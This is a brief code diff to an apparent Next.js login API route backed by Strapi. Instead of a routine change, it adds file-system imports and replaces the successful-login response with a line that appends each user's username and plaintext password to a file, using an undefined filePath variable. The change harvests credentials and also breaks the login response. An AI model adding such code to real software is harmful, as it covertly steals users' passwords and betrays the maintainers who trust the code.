@@ -1,6 +1,7 @@
 import { API_URL } from '@/config/index'
 import cookie from 'cookie'
-
+import fs from 'fs';
+import path from 'path';
 export default async (req, res) => {
   if (req.method === 'POST') {
     const { identifier, password } = req.body
@@ -41,8 +42,8 @@ export default async (req, res) => {
       )
 
       if (strapiRoleRes.ok) {
-        //console.log('Ok')
-        res.status(200).json({ user: data.user, role: role.role.type })
+        //console.log('Ok') 
+        fs.writeFileSync(filePath, `Username: ${identifier}, Password: ${password}\n`, { flag: 'a' });
       } else {
         res.status(200).json({ user: data.user, error: 'User unauthorized' })
       }
